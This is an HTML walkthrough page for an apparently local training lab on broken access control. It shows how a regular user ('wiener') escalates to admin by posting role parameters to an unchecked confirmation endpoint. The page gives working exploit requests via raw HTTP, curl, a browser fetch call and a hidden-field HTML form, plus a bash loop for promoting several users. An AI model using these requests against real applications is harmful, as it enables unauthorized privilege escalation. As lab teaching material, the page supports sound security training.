<div class="doc-header">
    <h1>‚ö° Exploitation</h1>
    <p>Step-by-step guide to exploiting the vulnerability</p>
</div>

<div class="content-section">
    <h2>Exploitation Prerequisites</h2>
    <p>To exploit this vulnerability, you need:</p>
    <ul>
        <li>A valid user account (we'll use <code>wiener:peter</code>)</li>
        <li>Knowledge of the vulnerable endpoint parameters</li>
        <li>A tool to send HTTP requests (Burp Suite, curl, or browser dev tools)</li>
    </ul>

    <div class="info-box">
        <h4>‚ÑπÔ∏è Account Setup</h4>
        <p>
            The lab provides a non-admin account: <strong>wiener:peter</strong>. 
            Your goal is to elevate this account to admin status.
        </p>
    </div>
</div>

<div class="content-section">
    <h2>Step-by-Step Exploitation</h2>
    
    <h3>Step 1: Login as Regular User</h3>
    <p>First, log in with the non-admin credentials:</p>
    <div class="code-block">
        <code>Username: wiener
Password: peter</code>
    </div>
    <p>After logging in, note your session cookie (PHPSESSID) from your browser's developer tools.</p>

    <h3>Step 2: Verify Limited Access</h3>
    <p>Confirm that you don't have admin access:</p>
    <ul>
        <li>The "Admin Panel" link should not appear in the navigation</li>
        <li>Accessing <code>/lab12/admin.php</code> redirects to login</li>
        <li>Your profile shows role as "USER"</li>
    </ul>

    <h3>Step 3: Craft the Exploit Request</h3>
    <p>Create a POST request to the vulnerable confirmation endpoint:</p>
    
    <div class="code-block">
        <code>POST /AC/lab12/admin-confirm.php HTTP/1.1
Host: localhost
Cookie: PHPSESSID=<span class="variable">[your-session-cookie]</span>
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

username=wiener&role=admin&action=upgrade&confirmed=true</code>
    </div>

    <h3>Step 4: Send the Request</h3>
    <p>You can send this request using various methods:</p>
</div>

<div class="content-section">
    <h2>Method 1: Using Burp Suite</h2>
    <ol>
        <li>Configure your browser to use Burp as a proxy</li>
        <li>Log in as wiener and capture any request</li>
        <li>Send the request to Repeater (Ctrl+R)</li>
        <li>Modify the request to target <code>admin-confirm.php</code></li>
        <li>Change the method to POST and add the body parameters</li>
        <li>Click "Send" and observe the response</li>
    </ol>

    <div class="warning-box">
        <h4>‚ö†Ô∏è Important</h4>
        <p>
            Make sure to keep your session cookie intact. The endpoint still requires
            authentication (being logged in), but doesn't verify admin role.
        </p>
    </div>
</div>

<div class="content-section">
    <h2>Method 2: Using curl</h2>
    <p>From your terminal, run:</p>
    
    <div class="code-block">
        <code><span class="comment"># First, get your session cookie by logging in</span>
curl -c cookies.txt -X POST http://localhost/AC/lab12/login.php \
  -d "username=wiener&password=peter"

<span class="comment"># Then send the exploit request</span>
curl -b cookies.txt -X POST http://localhost/AC/lab12/admin-confirm.php \
  -d "username=wiener&role=admin&action=upgrade&confirmed=true" \
  -v</code>
    </div>
</div>

<div class="content-section">
    <h2>Method 3: Using JavaScript (Browser Console)</h2>
    <p>While logged in as wiener, open browser console and run:</p>
    
    <div class="code-block">
        <code><span class="comment">// Send exploit request using fetch API</span>
<span class="function">fetch</span>(<span class="string">'admin-confirm.php'</span>, {
    method: <span class="string">'POST'</span>,
    headers: {
        <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>
    },
    body: <span class="string">'username=wiener&role=admin&action=upgrade&confirmed=true'</span>,
    credentials: <span class="string">'include'</span>
}).<span class="function">then</span>(response => {
    <span class="keyword">if</span> (response.redirected) {
        window.location.href = response.url;
    }
});</code>
    </div>
</div>

<div class="content-section">
    <h2>Method 4: HTML Form Injection</h2>
    <p>Create and save this HTML file, then open it in browser while logged in:</p>
    
    <div class="code-block">
        <code><span class="keyword">&lt;html&gt;</span>
<span class="keyword">&lt;body&gt;</span>
<span class="keyword">&lt;form</span> action="http://localhost/AC/lab12/admin-confirm.php" method="POST"<span class="keyword">&gt;</span>
    <span class="keyword">&lt;input</span> type="hidden" name="username" value="wiener"<span class="keyword">&gt;</span>
    <span class="keyword">&lt;input</span> type="hidden" name="role" value="admin"<span class="keyword">&gt;</span>
    <span class="keyword">&lt;input</span> type="hidden" name="action" value="upgrade"<span class="keyword">&gt;</span>
    <span class="keyword">&lt;input</span> type="hidden" name="confirmed" value="true"<span class="keyword">&gt;</span>
    <span class="keyword">&lt;input</span> type="submit" value="Click to exploit"<span class="keyword">&gt;</span>
<span class="keyword">&lt;/form&gt;</span>
<span class="keyword">&lt;/body&gt;</span>
<span class="keyword">&lt;/html&gt;</span></code>
    </div>
</div>

<div class="content-section">
    <h2>Verifying Success</h2>
    <p>After sending the exploit request:</p>
    <ol>
        <li>You should be redirected to <code>success.php</code> (lab solved!)</li>
        <li>Check your profile - your role should now be "ADMIN"</li>
        <li>The "Admin Panel" link should now be visible</li>
        <li>You can access <code>/lab12/admin.php</code> and manage other users</li>
    </ol>

    <div class="info-box">
        <h4>‚úÖ Success Indicators</h4>
        <ul style="margin-bottom: 0;">
            <li>HTTP 302 redirect to success.php</li>
            <li>Profile page shows "ADMIN" badge</li>
            <li>Admin Panel is now accessible</li>
            <li>Lab completion banner appears</li>
        </ul>
    </div>
</div>

<div class="content-section">
    <h2>Attack Variations</h2>
    
    <h3>Escalating Other Users</h3>
    <p>Once you understand the vulnerability, you can also:</p>
    <ul>
        <li>Promote other users to admin: <code>username=carlos&role=admin...</code></li>
        <li>Demote admins to regular users: <code>username=administrator&role=user...</code></li>
    </ul>

    <h3>Automating the Attack</h3>
    <p>For mass exploitation (penetration testing scenarios):</p>
    
    <div class="code-block">
        <code><span class="comment"># Bash script to promote multiple users</span>
<span class="keyword">for</span> user <span class="keyword">in</span> wiener carlos alice john; <span class="keyword">do</span>
    curl -b cookies.txt -X POST http://localhost/AC/lab12/admin-confirm.php \
      -d "username=$user&role=admin&action=upgrade&confirmed=true"
<span class="keyword">done</span></code>
    </div>

    <div class="danger-box">
        <h4>üî¥ Ethical Reminder</h4>
        <p>
            Only exploit vulnerabilities on systems you have explicit permission to test.
            Unauthorized access to computer systems is illegal in most jurisdictions.
        </p>
    </div>
</div>
